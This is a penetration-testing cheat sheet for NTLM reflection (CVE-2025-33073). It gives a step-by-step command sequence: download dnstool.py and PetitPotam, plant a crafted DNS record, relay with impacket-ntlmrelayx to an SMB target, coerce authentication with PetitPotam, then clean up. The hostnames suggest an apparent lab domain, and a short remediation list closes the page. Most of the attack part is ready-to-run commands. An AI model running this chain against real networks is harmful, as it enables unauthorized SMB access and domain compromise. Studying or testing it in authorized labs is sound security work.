# NTLM Reflection (CVE-2025-33073)


## Required Tools

```bash
# dnstool.py
wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/refs/heads/master/dnstool.py

# petitpotam.py
wget https://raw.githubusercontent.com/topotam/PetitPotam/refs/heads/main/PetitPotam.py
```

## Requirements

- Patch for CVE-2025-33073 not installed
- SMB Signing not required
- Ability to create DNS records (Default)


> Create DNS Record
```python
python3 dnstool.py -u 'sevenkingdoms.local\rc4' -p 'Password123' 'DC IP' -a add -d 'LISTENER IP' -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' 
```
> Verify Record points to listener
```python
python3 dnstool.py -u 'sevenkingdoms.local\rc4' -p 'Password123' 'DC IP' -a query -d 'LISTENER IP' -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
```
> Setup ntlmrelayx
```python
impacket-ntlmrelayx -t smb://the-eyrie.sevenkingdoms.local -smb2support
```
> Coerce
```python
python3 PetitPotam.py -d sevenkingdoms.local -u rc4 -p 'Password123' localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 'the-eyrie.sevenkingdoms.local'
```

#### Cleanup
```python
python3 dnstool.py -u 'sevenkingdoms.local\rc4' -p 'Password123' 'DC IP' -a ldapdelete -d 'LISTENER IP' -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
```

## Remediation

- Install patch for [CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- Ensure "Authenticated Users" are not able to create DNS records
- Ensure SMB signing is enforced on all systems